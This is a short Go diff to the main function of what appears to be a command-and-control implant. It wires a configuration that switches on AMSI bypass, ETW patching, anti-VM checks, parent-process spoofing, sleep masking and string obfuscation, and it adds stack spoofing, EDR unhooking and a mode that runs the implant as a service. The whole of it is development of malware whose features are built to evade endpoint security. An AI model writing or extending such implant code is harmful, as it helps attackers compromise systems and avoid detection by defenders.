@@ -17,10 +17,12 @@ func main() {
 			"to override.")
 		os.Exit(1)
 	}
-	core.Main(core.Config{
+	cfg := core.Config{
 		DefaultURL:           DefaultURL,
 		DefaultProfile:       DefaultProfile,
 		ServerPubKeyPem:      ServerPubKeyPem,
+		AgentVersion:         AgentVersionRaw,
+		StackSpoof:           truthy(StackSpoofRaw),
 		ClientCertPem:        ClientCertPem,
 		ClientKeyPem:         ClientKeyPem,
 		RootCAPem:            RootCAPem,
@@ -83,11 +85,16 @@ func main() {
 		AntiVM:            truthy(AntiVmRaw),
 		PpidSpoof:         truthy(PpidSpoofRaw),
 		AmsiBypass:        truthy(AmsiBypassRaw),
+		Unhook:            truthy(UnhookRaw),
 		EtwPatch:          truthy(EtwPatchRaw),
 		SleepMask:         truthy(SleepMaskEnabledRaw),
 		StringObfuscation: truthy(StringObfuscationRaw),
 		Verbose:           truthy(VerboseRaw),
-	})
+	}
+	if runService(cfg) {
+		return
+	}
+	core.Main(cfg)
 }
 
 func atoi(s string, def int) int {
